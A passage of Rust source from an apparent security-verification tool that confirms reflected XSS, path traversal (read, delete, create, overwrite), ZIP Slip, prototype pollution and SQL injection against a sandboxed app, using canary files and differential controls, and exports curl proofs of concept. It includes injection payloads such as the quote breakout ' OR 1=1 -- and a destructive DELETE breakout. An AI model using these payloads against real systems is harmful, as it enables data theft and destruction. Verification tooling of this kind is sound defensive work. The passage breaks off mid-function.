    /// with each context-breakout canary placed in the tainted URL input, load the rendered response
    /// in a headless browser, and confirm the injected script executed by finding the value the canary
    /// computes at runtime (the product of two factors) in the final DOM. A reflection the app escapes
    /// never computes that product, so a hit is unambiguous execution — the same thing a victim's
    /// browser would do. Runs in the local browser runtime; Docker reflected-XSS is skipped with a
    /// reason.
    pub fn exercise_reflected_xss(&mut self, probe: &super::plan::ReflectedXss) -> Outcome {
        self.nonce += 1;
        let executable = match &self.runtime {
            Runtime::Local { .. } => match local_browser_executable() {
                Some(executable) => executable,
                None => {
                    return Outcome::Skipped {
                        reason:
                            "reflected XSS verification needs a Chromium/Chrome browser on the \
                                 host; none was found"
                                .to_owned(),
                    };
                }
            },
            Runtime::Docker => {
                return Outcome::Skipped {
                    reason: "reflected XSS verification runs in the local browser runtime \
                             (JSS_VERIFY_RUNTIME=local)"
                        .to_owned(),
                };
            }
        };
        let attempts = super::reflected::reflected_xss_attempts(probe, self.nonce);
        let tried = attempts.len();
        let helper_dir = std::env::temp_dir().join(format!("jss-reflected-{}", run_id()));
        if let Err(error) = std::fs::create_dir_all(&helper_dir) {
            return Outcome::Skipped {
                reason: format!("could not create the browser profile directory: {error}"),
            };
        }
        let mut outcome = Outcome::NotReproduced { tried };
        for attempt in &attempts {
            let url = format!("http://127.0.0.1:{}{}", self.port, attempt.request_target);
            let dom = match run_local_browser_capture(&executable, &url, &helper_dir) {
                Ok(dom) => dom,
                Err(error) => {
                    if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
                        eprintln!("[verify] reflected-xss browser load {url} failed: {error}");
                    }
                    continue;
                }
            };
            let hit = dom.contains(&attempt.exec_token);
            if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
                eprintln!(
                    "[verify] reflected-xss {} payload={} token={} hit={hit}",
                    attempt.context, attempt.payload, attempt.exec_token
                );
            }
            if hit {
                let target = attempt.request_target.clone();
                outcome = Outcome::Verified {
                    how: format!("browser load {target} ({})", attempt.context),
                    poc: Reproduction {
                        command: format!(
                            "open {}",
                            shell_quote(&format!("http://TARGET_HOST{target}"))
                        ),
                        method: "BROWSER".to_owned(),
                        target,
                        headers: Vec::new(),
                        body: None,
                        evidence: format!(
                            "a headless browser rendered the application's HTTP response and executed \
                             the reflected payload `{}` (context: {}): the script computed and wrote \
                             `{}` into the page, which a correctly escaped reflection never does",
                            attempt.payload, attempt.context, attempt.exec_token
                        ),
                        response: reflected_dom_excerpt(&dom, &attempt.exec_token),
                        controls: Vec::new(),
                    },
                };
                break;
            }
        }
        let _ = std::fs::remove_dir_all(&helper_dir);
        outcome
    }

    /// Confirms a path-traversal read whose content is not reflected, by a differential oracle: a
    /// canary planted only outside the base directory makes the handler take its file-found branch,
    /// while two equivalent unplanted out-of-base paths take its not-found branch. URL reflection
    /// (a not-found page echoing the requested id) is neutralized before comparing, and the two
    /// unplanted responses must agree, so a handler that confines the path — reaching none of the
    /// three — yields no signal.
    fn verify_read_oracle(&self, probe: &Probe) -> Option<Reproduction> {
        // The climbed path may enter the request several ways (the entry, or a parsed query parameter
        // under a gate) and the found canary has two shapes (text, image); try each until one shows
        // the file-found/not-found differential.
        payload::read_oracle(probe, &self.canary, self.nonce)
            .iter()
            .find_map(|oracle| self.try_read_oracle(oracle))
    }

    /// Runs one read-oracle candidate's three-request differential; see [`Self::verify_read_oracle`].
    fn try_read_oracle(&self, oracle: &payload::ReadOracle) -> Option<Reproduction> {
        // Establish both controls before touching the planted path. Some vulnerable handlers enter
        // the file-found branch and then crash in downstream processing of the loaded fixture; its
        // response is still valid evidence, but sending it first would kill the process before the
        // not-found controls can be observed.
        let absent = self.fetch(&oracle.absent)?;
        let absent_sub = self.fetch(&oracle.absent_sub)?;
        let present = self.fetch(&oracle.present)?;
        if present.trim().is_empty() {
            return None;
        }
        let present_n = strip_request_echo(&present, &oracle.present.target, &oracle.present_value);
        let absent_n = strip_request_echo(&absent, &oracle.absent.target, &oracle.absent_value);
        let absent_sub_n = strip_request_echo(
            &absent_sub,
            &oracle.absent_sub.target,
            &oracle.absent_sub_value,
        );
        if present_n == absent_n || present_n == absent_sub_n || absent_n != absent_sub_n {
            return None;
        }
        Some(Reproduction {
            command: curl_command(&oracle.present, self.port),
            method: oracle.present.verb.to_owned(),
            target: oracle.present.target.clone(),
            headers: Vec::new(),
            body: None,
            evidence: "a canary file planted only outside the application's base directory was \
                reached by traversal: the handler took its file-found path for the planted path but \
                its not-found path for an equivalent unplanted path, proving the read opened the \
                attacker-controlled path outside the base directory"
                .to_owned(),
            response: response_excerpt(&present),
            controls: Vec::new(),
        })
    }

    /// Confirms a path-traversal removal (`fs.unlink`, `fs.rm`, …) by a destructive differential: a
    /// `target` file is planted outside the application's base directory, and a `control` file is
    /// planted alongside it that the request never names. The present request climbs to `target` and
    /// asks the handler to remove it. A vulnerable handler opens the attacker-controlled path and
    /// removes `target` (it disappears) while `control` survives; a handler that confines the path
    /// reaches neither. The planting and the request both stay inside the isolated app container.
    fn verify_delete_oracle(&self, probe: &Probe) -> Option<Reproduction> {
        let oracle = payload::delete_oracle(probe, &self.canary, self.nonce)?;
        let parent = match oracle.target_path.rfind('/') {
            Some(at) => &oracle.target_path[..at],
            None => oracle.dir.as_str(),
        };
        // `fs.rmdirSync` (and recursive helpers guarded by `isDirectory()`) only remove a directory,
        // so plant the target and control as directories; `fs.unlink`/`fs.rm` remove a file, so plant
        // files. Planting the wrong kind would make the removal error before any differential fires.
        let plant = if probe.removes_dir {
            format!(
                "mkdir -p '{parent}' '{dir}' '{target}' '{control}'",
                dir = oracle.dir,
                target = oracle.target_path,
                control = oracle.control_path,
            )
        } else {
            format!(
                "mkdir -p '{parent}' '{dir}' && : > '{target}' && : > '{control}'",
                dir = oracle.dir,
                target = oracle.target_path,
                control = oracle.control_path,
            )
        };
        let planted = self.exec(&self.app, &["sh", "-c", &plant]);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] delete oracle plant={planted:?} target={} target-exists={} control={} control-exists={}",
                oracle.target_path,
                self.file_exists(&oracle.target_path),
                oracle.control_path,
                self.file_exists(&oracle.control_path)
            );
        }
        // Both planted entries must exist before the request, or the differential proves nothing.
        if !self.file_exists(&oracle.target_path) || !self.file_exists(&oracle.control_path) {
            return None;
        }
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] delete oracle request={} {} target={} control={}",
                oracle.present.verb, oracle.present.target, oracle.target_path, oracle.control_path
            );
        }
        let response = self.fetch(&oracle.present);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] delete oracle response={response:?} target-exists={} control-exists={}",
                self.file_exists(&oracle.target_path),
                self.file_exists(&oracle.control_path)
            );
        }
        // The target must be gone (the traversal reached it) and the control must survive (the
        // removal was directed by the attacker-controlled path, not an indiscriminate wipe).
        if self.file_exists(&oracle.target_path) || !self.file_exists(&oracle.control_path) {
            return None;
        }
        let entry_kind = if probe.removes_dir {
            "directory"
        } else {
            "file"
        };
        Some(Reproduction {
            command: curl_command(&oracle.present, self.port),
            method: oracle.present.verb.to_owned(),
            target: oracle.present.target.clone(),
            headers: Vec::new(),
            body: oracle.present.body.clone(),
            evidence: format!(
                "a canary {entry_kind} planted outside the application's base directory was removed \
                 by the traversal request while a sibling control {entry_kind} planted alongside it \
                 survived, proving the removal opened the attacker-controlled path outside the base \
                 directory"
            ),
            response: String::new(),
            controls: Vec::new(),
        })
    }

    /// Confirms a path-traversal create (`fs.mkdir`, `fs.writeFile`, an upload move) by a constructive
    /// differential: an empty directory is planted outside the application's base directory, and an
    /// empty `control` directory is planted alongside it that the request never names. The present
    /// requests climb into the planted directory and ask the handler to create an entry there. A
    /// vulnerable handler opens the attacker-controlled path and leaves the planted directory non-empty
    /// (an entry was created outside the base) while `control` stays empty; a handler that confines the
    /// path creates inside the base and leaves both empty. The planting and the requests both stay
    /// inside the isolated app container.
    fn verify_create_oracle(&self, probe: &Probe) -> Option<Reproduction> {
        let oracle = payload::create_oracle(probe, &self.canary, self.nonce)?;
        // The create runs as the app process, which may be a dropped non-root user; make the planted
        // directories writable so a genuine traversal is not masked by a permission error.
        let plant = format!(
            "rm -rf '{dir}' '{control}' && mkdir -p '{dir}' '{control}' && chmod 777 '{dir}' '{control}'",
            dir = oracle.dir,
            control = oracle.control,
        );
        let _ = self.exec(&self.app, &["sh", "-c", &plant]);
        // Both planted directories must exist and be empty before the request, or the differential
        // proves nothing.
        if !self.dir_empty(&oracle.dir) || !self.dir_empty(&oracle.control) {
            return None;
        }
        // Stop at the exact request that creates the entry so the exported PoC independently
        // reproduces the observed effect. Different sinks need different shapes: `mkdir` commonly
        // needs the fresh leaf, while an upload move may populate the existing directory itself.
        let witness = oracle.present.iter().find(|attempt| {
            let _ = self.fetch(attempt);
            !self.dir_empty(&oracle.dir) && self.dir_empty(&oracle.control)
        });
        let _ = self.exec(
            &self.app,
            &[
                "sh",
                "-c",
                &format!("rm -rf '{}' '{}'", oracle.dir, oracle.control),
            ],
        );
        let witness = witness?;
        Some(Reproduction {
            command: curl_command(witness, self.port),
            method: witness.verb.to_owned(),
            target: witness.target.clone(),
            headers: Vec::new(),
            body: witness.body.clone(),
            evidence:
                "an empty directory planted outside the application's base directory received a new \
                entry created by the traversal request while a sibling control directory planted \
                alongside it stayed empty, proving the create opened the attacker-controlled path \
                outside the base directory"
                    .to_owned(),
            response: String::new(),
            controls: Vec::new(),
        })
    }

    /// Confirms an archive-entry traversal by uploading a one-file ZIP whose entry climbs into an
    /// empty canary directory outside the extraction base. The sibling control directory stays
    /// empty, so a hit proves the archive entry name controlled the write path rather than merely
    /// exercising the upload endpoint.
    fn verify_archive_create_oracle(&self, probe: &Probe) -> Option<Reproduction> {
        let unique = format!("jss-zip-{}-{}", self.canary.token, self.nonce);
        // Keep the witness outside the extraction directory but inside the application's working
        // tree. Some applications reject writes outside their project root while still allowing an
        // archive entry to escape its intended upload directory (which is still ZIP Slip).
        let pwd = self.exec(&self.app, &["pwd"]).ok()?;
        let workdir = String::from_utf8_lossy(&pwd.stdout).trim().to_owned();
        if !valid_container_workdir(&workdir) {
            return None;
        }
        let workdir = workdir.trim_end_matches('/');
        let dir = format!("{workdir}/{}/{unique}", payload::PLANTED_DIR);
        let control = format!("{workdir}/{}/{unique}-keep", payload::PLANTED_DIR);
        let plant = format!(
            "rm -rf '{dir}' '{control}' && mkdir -p '{dir}' '{control}' && chmod 777 '{dir}' '{control}'"
        );
        let _ = self.exec(&self.app, &["sh", "-c", &plant]);
        if !self.dir_empty(&dir) || !self.dir_empty(&control) {
            return None;
        }

        let workdir_prefix = match workdir.trim_start_matches('/') {
            "" => String::new(),
            relative => format!("{relative}/"),
        };
        let entry = format!(
            "{}{workdir_prefix}{}/{unique}/jss-zip-leaf",
            "../".repeat(12),
            payload::PLANTED_DIR
        );
        let archive = stored_zip(&entry, self.canary.token.as_bytes());
        let boundary = format!("jsspector-{}", self.nonce);
        let multipart = multipart_file(
            &boundary,
            "file",
            "jsspector.zip",
            "application/zip",
            &archive,
        );
        let target = payload::fill_remaining(&probe.path, &probe.path_fillers);
        let verb = probe.method.verb(&probe.entry);
        let spec = binary_request_spec(
            self.port,
            verb,
            &target,
            &[(
                "Content-Type".to_owned(),
                format!("multipart/form-data; boundary={boundary}"),
            )],
            &multipart,
            self.tls,
        );
        let output = self
            .exec(&self.app, &["node", "/jss-driver.js", &spec])
            .ok()?;
        let response = String::from_utf8_lossy(&output.stdout).into_owned();
        let reproduced = !self.dir_empty(&dir) && self.dir_empty(&control);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] archive {} {} entry={entry:?} target_dir={dir:?} -> status {:?} stderr[{}] body[{}] reproduced={reproduced}",
                verb,
                target,
                output.status.code(),
                String::from_utf8_lossy(&output.stderr).trim(),
                response_excerpt(&response),
            );
        }
        let _ = self.exec(
            &self.app,
            &["sh", "-c", &format!("rm -rf '{dir}' '{control}'")],
        );
        if !reproduced {
            return None;
        }
        let archive_b64 = base64(&archive);
        let command = format!(
            "printf %s {} | base64 -d > /tmp/jsspector.zip\n{} \\\n  --form {}",
            shell_quote(&archive_b64),
            curl_command(
                &Attempt {
                    verb,
                    target: target.clone(),
                    body: None,
                    headers: Vec::new(),
                    signal: Signal::FileWritten(format!("{dir}/jss-zip-leaf")),
                },
                self.port,
            ),
            shell_quote("file=@/tmp/jsspector.zip;filename=jsspector.zip;type=application/zip")
        );
        Some(Reproduction {
            command,
            method: verb.to_owned(),
            target,
            headers: Vec::new(),
            body: None,
            evidence: "a ZIP entry containing traversal segments created a canary file outside the extraction directory while a sibling control directory stayed empty"
                .to_owned(),
            response: response_excerpt(&response),
            controls: Vec::new(),
        })
    }

    /// Whether a path exists, is a directory, and holds no entries inside the running app container.
    /// Used by the create oracle to observe, out of band from the HTTP response, that a planted
    /// directory went from empty to holding an entry created by a traversal request.
    fn dir_empty(&self, path: &str) -> bool {
        self.exec(
            &self.app,
            &[
                "sh",
                "-c",
                &format!("[ -d '{path}' ] && [ -z \"$(ls -A '{path}')\" ] && echo Y || echo N"),
            ],
        )
        .ok()
        .filter(|output| output.status.success())
        .is_some_and(|output| String::from_utf8_lossy(&output.stdout).contains('Y'))
    }

    /// Confirms a path-traversal write that *overwrites an existing* file (`fs.writeFile` after the
    /// handler opens the same path) by a content differential: a `target` file is planted outside the
    /// application's base directory with known content, and a `control` file is planted alongside it the
    /// request never names. The request climbs to `target` and asks the handler to write it. A
    /// vulnerable handler rewrites `target` (its content changes) while `control` keeps its content; a
    /// handler that confines the path reaches neither. One request per candidate route is tried, since a
    /// controller method mounted on several paths may write only on the branch its route selects. The
    /// planting and the requests both stay inside the isolated app container.
    fn verify_overwrite_oracle(&self, probe: &Probe) -> Option<Reproduction> {
        let oracle = payload::overwrite_oracle(probe, &self.canary, self.nonce)?;
        let document = base64(oracle.planted.as_bytes());
        for attempt in &oracle.present {
            // Re-plant fresh target and control with identical known content before each attempt, so a
            // prior attempt that rewrote the target cannot mask or fake a later one. The write runs as
            // the app process (possibly a dropped non-root user); make the files writable.
            let plant = format!(
                "rm -rf '{dir}' && mkdir -p '{dir}' && echo {document} | base64 -d > '{target}' && echo {document} | base64 -d > '{control}' && chmod 777 '{dir}' && chmod 666 '{target}' '{control}'",
                dir = oracle.dir,
                target = oracle.target_path,
                control = oracle.control_path,
            );
            let _ = self.exec(&self.app, &["sh", "-c", &plant]);
            // Both files must exist with the planted content before the request, or the differential
            // proves nothing.
            if self.file_contents(&oracle.target_path).as_deref() != Some(oracle.planted.as_str())
                || self.file_contents(&oracle.control_path).as_deref()
                    != Some(oracle.planted.as_str())
            {
                continue;
            }
            let _ = self.fetch(attempt);
            // The target must have been rewritten (content changed) and the control left untouched: the
            // write was directed by the attacker-controlled path, not an indiscriminate rewrite.
            let changed = self
                .file_contents(&oracle.target_path)
                .is_some_and(|after| after != oracle.planted);
            let control_intact = self.file_contents(&oracle.control_path).as_deref()
                == Some(oracle.planted.as_str());
            if changed && control_intact {
                let _ = self.exec(
                    &self.app,
                    &["sh", "-c", &format!("rm -rf '{}'", oracle.dir)],
                );
                return Some(Reproduction {
                    command: curl_command(attempt, self.port),
                    method: attempt.verb.to_owned(),
                    target: attempt.target.clone(),
                    headers: Vec::new(),
                    body: attempt.body.clone(),
                    evidence:
                        "a canary file planted outside the application's base directory with known \
                        content was overwritten by the traversal request while a sibling control file \
                        planted alongside it kept its content, proving the write opened the \
                        attacker-controlled path outside the base directory"
                            .to_owned(),
                    response: String::new(),
                    controls: Vec::new(),
                });
            }
        }
        let _ = self.exec(
            &self.app,
            &["sh", "-c", &format!("rm -rf '{}'", oracle.dir)],
        );
        None
    }

    /// The exact bytes of a file inside the running app container, or `None` when it does not exist.
    /// Used by the overwrite oracle to observe, out of band from the HTTP response, that a planted
    /// file's content was rewritten by a traversal request.
    fn file_contents(&self, path: &str) -> Option<String> {
        let output = self
            .exec(&self.app, &["sh", "-c", &format!("cat '{path}'")])
            .ok()?;
        output
            .status
            .success()
            .then(|| String::from_utf8_lossy(&output.stdout).into_owned())
    }

    /// Confirms a nested-write prototype-pollution sink (`obj[outer][inner] = v`) by reading the
    /// injected property back off a freshly created object through the handler itself. Four requests
    /// (see [`payload::ProtoOracle`]): a pre-pollution read of a fresh object for the marker key
    /// (`baseline`), the `__proto__` write of that key (`pollute`), a post-pollution read of a
    /// *different* fresh object for the same key (`probe`), and a read of a fresh object for an
    /// unpolluted key (`control`). The sink genuinely polluted `Object.prototype` only if the
    /// post-pollution read differs from both the pre-pollution read (same key, fresh object) and the
    /// unpolluted-key read, while the two unpolluted reads agree — so a fresh object now carries a
    /// property it was never given, and only the polluted key. A confining handler, or a pure-write
    /// sink that never reads the property back, answers the reads alike and nothing is reproduced.
    fn verify_proto_pollution(&self, probe: &Probe) -> Option<Reproduction> {
        // The finding's entry may carry a mount prefix the isolated verifier drops (it mounts the
        // handler's own router at the root). Try the full path and each router-relative variant; a
        // wrong base only 404s identically for every request, so it cannot fabricate a reproduction.
        for base in payload::proto_base_candidates(&probe.path) {
            if let Some(poc) = self.try_proto_pollution(probe, &base) {
                return Some(poc);
            }
        }
        None
    }

    /// Run the read-back prototype-pollution differential for one candidate route base.
    fn try_proto_pollution(&self, probe: &Probe, base: &str) -> Option<Reproduction> {
        let oracle = payload::proto_pollution_oracle(probe, &self.canary, self.nonce, base)?;
        let baseline = self.fetch(&oracle.baseline)?;
        let _ = self.fetch(&oracle.pollute);
        let after = self.fetch(&oracle.probe)?;
        let control = self.fetch(&oracle.control)?;
        let (a, b, c) = (after.trim(), baseline.trim(), control.trim());
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] proto-pollution base={base} baseline[{}] probe[{}] control[{}]",
                b.chars().take(80).collect::<String>(),
                a.chars().take(80).collect::<String>(),
                c.chars().take(80).collect::<String>(),
            );
        }
        // The post-pollution read of a fresh object must differ from both the pre-pollution read of
        // the same key and the unpolluted-key read, and the two unpolluted reads must agree. An empty
        // post-pollution response carries no observable branch, so it is not a reproduction.
        if a.is_empty() || a == b || a == c || b != c {
            return None;
        }
        let describe = |value: &str| {
            let excerpt = response_excerpt(value);
            if excerpt.trim().is_empty() {
                "an empty body".to_owned()
            } else {
                format!("`{}`", excerpt.trim().replace('`', "'"))
            }
        };
        Some(Reproduction {
            // The read-back request proves the effect only after the `__proto__` write. Keep both
            // requests in the copyable PoC, in the same order used by the verifier. The write-side
            // handler may intentionally hold its response open, so bound only that request.
            command: format!(
                "{}\n{}",
                curl_command(&oracle.pollute, self.port).replacen(
                    "curl -i -sS",
                    "curl -i -sS --max-time 2",
                    1,
                ),
                curl_command(&oracle.probe, self.port),
            ),
            method: oracle.probe.verb.to_owned(),
            target: oracle.probe.target.clone(),
            headers: Vec::new(),
            body: oracle.probe.body.clone(),
            evidence: format!(
                "before the `__proto__` write, reading the marker key from a fresh object returned \
                {}; after the write, a different fresh object returned {}; an independent fresh \
                object queried with a never-polluted key returned {}. The two negative controls \
                agree and only the polluted key changes the handler's branch, proving the write \
                reached Object.prototype rather than one ordinary object",
                describe(&baseline),
                describe(&after),
                describe(&control),
            ),
            response: response_excerpt(&after),
            controls: Vec::new(),
        })
    }

    /// Whether a path exists inside the running app container. Used by the removal oracle to observe,
    /// out of band from the HTTP response, that a planted file was deleted by a traversal request.
    fn file_exists(&self, path: &str) -> bool {
        self.exec(
            &self.app,
            &["sh", "-c", &format!("test -e '{path}' && echo Y || echo N")],
        )
        .ok()
        .filter(|output| output.status.success())
        .is_some_and(|output| String::from_utf8_lossy(&output.stdout).contains('Y'))
    }

    /// Writes the canary document at `<planted_dir>/<suffix>` inside the running app container, so a
    /// traversal that climbs to the planted directory — with the handler's own fixed segment appended
    /// — reads a real token file. `suffix` is already validated filesystem-safe by the planner. The
    /// write stays inside the isolated container; nothing about the proof is weakened.
    fn plant_suffix_canary(&self, suffix: &str) {
        let dir = self.canary.planted_dir();
        let file = format!("{dir}/{suffix}");
        let parent = match file.rfind('/') {
            Some(at) => &file[..at],
            None => dir.as_str(),
        };
        let document = base64(self.canary.planted_dir_document().as_bytes());
        let script = format!("mkdir -p '{parent}' && echo {document} | base64 -d > '{file}'");
        let _ = self.exec(&self.app, &["sh", "-c", &script]);
    }

    /// Creates a canary directory (under the appended sibling value `subdir`, when the handler appends
    /// one) holding a single token-named file inside the running app container, so a directory-listing
    /// traversal that climbs to it enumerates an entry name carrying the token. `subdir` is already
    /// validated filesystem-safe by the planner; the token is alphanumeric. The write stays inside the
    /// isolated container, and the proof is the token name surfacing, nothing weaker.
    fn plant_listing_canary(&self, subdir: &str, nonce: u32) {
        let base = self.canary.planted_dir();
        let dir = if subdir.is_empty() {
            base
        } else {
            format!("{base}/{subdir}")
        };
        let file = format!("{dir}/{}", self.canary.listing_token(nonce));
        let script = format!("mkdir -p '{dir}' && : > '{file}'");
        let _ = self.exec(&self.app, &["sh", "-c", &script]);
    }

    /// Confirms a table-identifier SQL injection by a response differential: the tainted identifier is
    /// replaced with a sub-select that the database must evaluate, returning a value it can only produce
    /// by concatenating two string literals (absent from the request text). A plain-identifier control
    /// request is sent too. The injection is proved only when the computed value surfaces in the
    /// injecting response but not the control's — a bound parameter can never introduce a computed
    /// column, so this is a genuine change to the statement's meaning, not mere taint reachability.
    fn exercise_sql(&self, probe: &Probe) -> Outcome {
        // A destructive table-identifier injection (`DELETE FROM "<id>" WHERE ...`) cannot be proved
        // by a reflected sub-select (a DELETE target is a table name, never a sub-query, and a quoted
        // identifier is never evaluated) nor by a response differential (the delete echoes nothing).
        // Prove it directly by a planted row disappearing under a quote-breakout.
        if probe
            .sql
            .as_ref()
            .and_then(|plan| plan.delete.as_ref())
            .is_some()
        {
            return match self.verify_sql_destructive_oracle(probe) {
                Some(poc) => Outcome::Verified {
                    how: format!("{} {}", poc.method, poc.target),
                    poc,
                },
                None => Outcome::NotReproduced { tried: 2 },
            };
        }
        let Some(case) = payload::sql_cases(probe, &self.canary, self.nonce) else {
            // A value-position injection (`WHERE email = '${x}'`) is not an identifier substitution and
            // cannot surface a computed sub-select; prove it by a boolean differential instead.
            if probe.sql_value.is_some() {
                return self.exercise_sql_value(probe);
            }
            return Outcome::Skipped {
                reason:
                    "the tainted value is not interpolated in a SQL table-identifier position that \
                    verify v1 drives"
                        .to_owned(),
            };
        };
        let (Some(positive), Some(negative)) =
            (self.fetch(&case.positive), self.fetch(&case.negative))
        else {
            return Outcome::NotReproduced { tried: 2 };
        };
        if positive.contains(&case.computed) && !negative.contains(&case.computed) {
            let attempt = &case.positive;
            return Outcome::Verified {
                how: format!("{} {}", attempt.verb, attempt.target),
                poc: Reproduction {
                    command: curl_command(attempt, self.port),
                    method: attempt.verb.to_owned(),
                    target: attempt.target.clone(),
                    headers: attempt
                        .headers
                        .iter()
                        .map(|(name, value)| format!("{name}: {value}"))
                        .collect(),
                    body: attempt.body.clone(),
                    evidence: format!(
                        concat!(
                            "the tainted route identifier was replaced with a sub-select the database ",
                            "evaluated: a value it can only produce by concatenating two string ",
                            "literals (`{}`) appeared in the response, while a plain-identifier control ",
                            "request did not — proving the injected text changed the statement's meaning ",
                            "rather than being passed as a bound parameter"
                        ),
                        case.computed
                    ),
                    response: positive.trim().to_owned(),
                    controls: Vec::new(),
                },
            };
        }
        // The reflected-value oracle needs the handler to echo a database-computed column. A handler
        // that never reflects the query result (it only branches on whether the row was found) hides a
        // genuine injection from it. Fall back to a boolean-blind differential: send sub-selects of
        // identical shape that differ only in whether the fabricated row satisfies the handler's bound
        // `WHERE`, and prove the injection when the row-found observable flips with that boolean while
        // two independent non-matching controls agree.
        if let Some(blind) = payload::sql_blind_cases(probe, &self.canary, self.nonce) {
            if let (Some(truthy), Some(falsy_a), Some(falsy_b)) = (
                self.fetch(&blind.truthy),
                self.fetch(&blind.falsy_a),
                self.fetch(&blind.falsy_b),
            ) && payload::sql_blind_reproduced(&truthy, &falsy_a, &falsy_b, &blind.volatile)
            {
                let attempt = &blind.truthy;
                return Outcome::Verified {
                    how: format!("{} {}", attempt.verb, attempt.target),
                    poc: Reproduction {
                        command: curl_command(attempt, self.port),
                        method: attempt.verb.to_owned(),
                        target: attempt.target.clone(),
                        headers: attempt
                            .headers
                            .iter()
                            .map(|(name, value)| format!("{name}: {value}"))
                            .collect(),
                        body: attempt.body.clone(),
                        evidence: concat!(
                            "the tainted route identifier was replaced with a sub-select the database ",
                            "evaluated: a matching fabricated row and a non-matching one — sub-selects ",
                            "of identical shape differing only in whether the bound `WHERE` matched — ",
                            "produced different handler responses, while two independent non-matching ",
                            "controls produced the same response, proving the injected text changed the ",
                            "statement's meaning rather than being passed as a bound parameter"
                        )
                        .to_owned(),
                        response: response_excerpt(&truthy),
                        controls: vec![
                            control_observation(
                                "non-matching fabricated row A",
                                &blind.falsy_a,
                                &falsy_a,
                            ),
                            control_observation(
                                "non-matching fabricated row B",
                                &blind.falsy_b,
                                &falsy_b,
                            ),
                        ],
                    },
                };
            }
            return Outcome::NotReproduced { tried: 5 };
        }
        Outcome::NotReproduced { tried: 2 }
    }

    /// Confirms a value-position SQL injection (`WHERE email = '${x}'`) by a boolean differential: the
    /// tainted value breaks out of the enclosing quote and appends an always-true boolean before a
    /// comment that neutralizes the statement's tail, so the statement's `WHERE` matches regardless of
    /// the real predicate. Two otherwise-identical requests append an always-false boolean. The
    /// injection is proved only when the always-true response differs from both always-false responses
    /// while the two always-false responses agree: the legs differ solely in the truth value of the
    /// injected boolean, so a response difference can come only from the database evaluating injected
    /// SQL — a bound parameter would treat all three as the same literal string and leave every
    /// response identical, so a parameterized (safe) sink never reproduces. Several comment styles are
    /// tried so a statement one marker fails to neutralize is still reached by another.
    fn exercise_sql_value(&self, probe: &Probe) -> Outcome {
        let cases = payload::sql_value_cases(probe, &self.canary);
        let tried = cases.len() * 3;
        for case in &cases {
            let (Some(truthy), Some(falsy_a), Some(falsy_b)) = (
                self.fetch(&case.truthy),
                self.fetch(&case.falsy_a),
                self.fetch(&case.falsy_b),
            ) else {
                continue;
            };
            if payload::sql_blind_reproduced(&truthy, &falsy_a, &falsy_b, &[]) {
                let attempt = &case.truthy;
                return Outcome::Verified {
                    how: format!("{} {}", attempt.verb, attempt.target),
                    poc: Reproduction {
                        command: curl_command(attempt, self.port),
                        method: attempt.verb.to_owned(),
                        target: attempt.target.clone(),
                        headers: attempt
                            .headers
                            .iter()
                            .map(|(name, value)| format!("{name}: {value}"))
                            .collect(),
                        body: attempt.body.clone(),
                        evidence: concat!(
                            "the tainted value was interpolated into a quoted string-literal position ",
                            "of the SQL statement: breaking out of the quote with an always-true ",
                            "boolean (`' OR 1=1 --`) produced a different handler response than two ",
                            "otherwise-identical requests whose breakout carried an always-false ",
                            "boolean (`' OR 1=2 --`, `' OR 1=3 --`), which agreed with each other — ",
                            "proving the injected text changed the statement's meaning rather than ",
                            "being passed as a bound parameter"
                        )
                        .to_owned(),
                        response: response_excerpt(&truthy),
                        controls: vec![
                            control_observation(
                                "always-false boolean 1=2",
                                &case.falsy_a,
                                &falsy_a,
                            ),
                            control_observation(
                                "always-false boolean 1=3",
                                &case.falsy_b,
                                &falsy_b,
                            ),
                        ],
                    },
                };
            }
        }
        Outcome::NotReproduced { tried }
    }

    /// Confirms a destructive table-identifier SQL injection (`DELETE FROM "<id>" WHERE ...`) by a
    /// DB-state differential, out of band from the HTTP response (which the handler never varies on
    /// the delete). A canary row is planted in the table the identifier names and in a sibling table
    /// the request never names. A `benign` request runs the handler's real `DELETE` with a plain
    /// identifier — its bound `WHERE` does not match the planted row, so the row survives. An
    /// otherwise-identical `breakout` request closes the identifier's quote and forces the filter
    /// true, deleting every row of the named table while the sibling survives. The planted row
    /// surviving the benign request but vanishing under the breakout — with the sibling intact —
    /// proves the injected text changed the statement's meaning rather than being bound as a
    /// parameter. All planting, requests and observation stay inside the isolated app container.
    fn verify_sql_destructive_oracle(&self, probe: &Probe) -> Option<Reproduction> {
        let oracle = payload::sql_delete_oracle(probe, &self.canary, self.nonce)?;
        let files = self.discover_sqlite_files();
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] SQL delete oracle tables={} sibling={} sqlite-files={:?}",
                oracle.table, oracle.sibling, files
            );
        }
        if files.is_empty() {
            return None;
        }
        self.run_node(&plant_rows_js(&files, &oracle));
        // Both canary tables must hold their planted row before the request, or the differential
        // proves nothing.
        let (t0, s0) = (
            self.count_table_rows(&files, &oracle.table)?,
            self.count_table_rows(&files, &oracle.sibling)?,
        );
        if t0 < 1 || s0 < 1 {
            return None;
        }
        // Negative control: the handler's real DELETE, driven by a plain identifier, must leave both
        // canary tables exactly as planted (its bound filter cannot match the planted row).
        let _ = self.fetch(&oracle.benign);
        let (t1, s1) = (
            self.count_table_rows(&files, &oracle.table)?,
            self.count_table_rows(&files, &oracle.sibling)?,
        );
        if t1 != t0 || s1 != s0 {
            return None;
        }
        // Positive: the breakout must delete rows from the named table while the unnamed sibling
        // table survives — a bound parameter could never name a table, and a plain identifier (the
        // negative control) just left the row.
        let _ = self.fetch(&oracle.breakout);
        let (t2, s2) = (
            self.count_table_rows(&files, &oracle.table)?,
            self.count_table_rows(&files, &oracle.sibling)?,
        );
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            eprintln!(
                "[verify] SQL delete oracle rows before={t0}/{s0} control={t1}/{s1} exploit={t2}/{s2}"
            );
        }
        if t2 < t1 && s2 == s1 {
            let attempt = &oracle.breakout;
            return Some(Reproduction {
                command: curl_command(attempt, self.port),
                method: attempt.verb.to_owned(),
                target: attempt.target.clone(),
                headers: attempt
                    .headers
                    .iter()
